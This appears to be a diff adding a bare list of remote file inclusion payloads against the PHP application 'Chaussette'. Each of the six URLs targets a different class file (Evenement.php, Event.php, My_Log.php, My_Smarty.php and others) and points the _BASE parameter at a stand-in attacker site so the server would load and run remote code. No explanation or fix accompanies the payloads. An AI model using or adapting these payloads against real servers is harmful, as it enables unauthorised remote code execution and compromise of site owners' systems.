@@ -1,0 +1,7 @@
+http://www.example.com/dir_Chaussette/Classes/Evenement.php?_BASE=http://attacker's site
+http://www.example.com/dir_Chaussette/Classes/Event.php?_BASE=http://attacker's site
+http://www.example.com/dir_Chaussette/Classes/Event_for_month.php?_BASE=http://attacker's site
+http://www.example.com/dir_Chaussette/Classes/Event_for_week.php?_BASE=http://attacker's site
+http://www.example.com/dir_Chaussette/Classes/My_Log.php?_BASE=http://attacker's site
+http://www.example.com/dir_Chaussette/Classes/My_Smarty.php?_BASE=http://attacker's site
+
